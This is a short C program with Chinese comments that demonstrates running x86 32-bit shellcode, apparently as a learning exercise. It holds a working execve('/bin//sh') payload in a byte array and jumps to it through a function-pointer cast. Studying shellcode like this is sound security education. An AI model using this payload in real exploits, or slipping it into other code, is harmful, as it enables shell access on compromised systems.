#include <stdlib.h>
#include <stdio.h>


/*
 * 用于32的x86系统 
 * 
 * 
 * 
 *
 */
int main (int argc,char** argv)
{
	/* 注意这里的shellcode是指机器码 */
	char shellcode[] = { "\x31\xc0" 
		             "\x50" 
			     "\x68\x2f\x2f\x73\x68"
			     "\x68\x2f\x62\x69\x6e"
			     "\x89\xe3"
		             "\x50" 
		             "\x53" 
		             "\x89\xe1" 
		             "\x31\xd2" 
		             "\xb0\x0b" 
		             "\xcd\x80" 
				};
/* 	void (*fp)(void);
	fp = (void *)shellcode;
	fp(); */

	(*(void (*)())shellcode)();  // 两种表达方式都可以

	return 0;
}
